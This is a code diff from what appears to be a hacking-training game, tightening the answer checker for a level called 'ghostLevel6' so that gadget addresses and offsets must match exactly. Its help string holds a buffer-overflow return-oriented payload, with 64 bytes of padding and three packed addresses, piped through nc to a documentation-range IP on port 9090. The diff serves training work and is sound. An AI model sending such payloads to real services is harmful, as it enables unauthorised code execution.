@@ -1,5 +1,5 @@
 import type { ChainDef } from "../../types";
-import { match, strictCmd } from "../../engine";
+import { match, strictCmd, matchesExactAddress, matchesExactOffset } from "../../engine";
 
 const IP = "192.0.2.60";
 
@@ -240,13 +240,13 @@ export const ghostLevel6: ChainDef = {
           match: (input) => {
             const n = input.toLowerCase();
             return (
-              n.includes("64") &&
-              n.includes("401293") &&
-              n.includes("402004") &&
-              n.includes("401060") &&
+              matchesExactOffset(n, 64) &&
+              matchesExactAddress(n, "401293") &&
+              matchesExactAddress(n, "402004") &&
+              matchesExactAddress(n, "401060") &&
               n.includes("nc ") &&
               n.includes(IP) &&
-              n.includes("9090")
+              matchesExactOffset(n, 9090)
             );
           },
           help: "python3 -c \"print('A'*64 + p64(0x401293) + p64(0x402004) + p64(0x401060))\" | nc <ip> 9090",
